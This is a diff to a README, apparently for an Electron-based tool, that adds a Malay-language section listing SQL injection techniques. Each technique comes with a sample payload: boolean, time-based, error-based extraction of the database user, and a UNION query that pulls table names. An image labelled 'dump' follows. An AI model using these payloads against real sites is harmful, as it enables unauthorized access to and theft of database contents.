@@ -82,3 +82,13 @@ npm start
 set ELECTRON_DISABLE_GPU=1
 npm start
 ```
+# Update (soon bila stable ) 
+```bash
+Teknik	Payload contoh	Cara detect
+✅ Boolean-Based	' OR 1=1-- vs ' OR 1=2--	Banding HTML
+✅ Time-Based	' OR IF(1=1, SLEEP(3), 0)--	Ukur delay response
+✅ Error-Based	' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58,97,58), (SELECT user()), CHAR(58,98,58), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x)a)--	Detect error
+✅ DIOS	' UNION SELECT null, table_name FROM information_schema.tables--	Extract table
+```
+
+![dump](https://github.com/user-attachments/assets/d6942e4c-8e27-415c-b76d-b763c245180d)
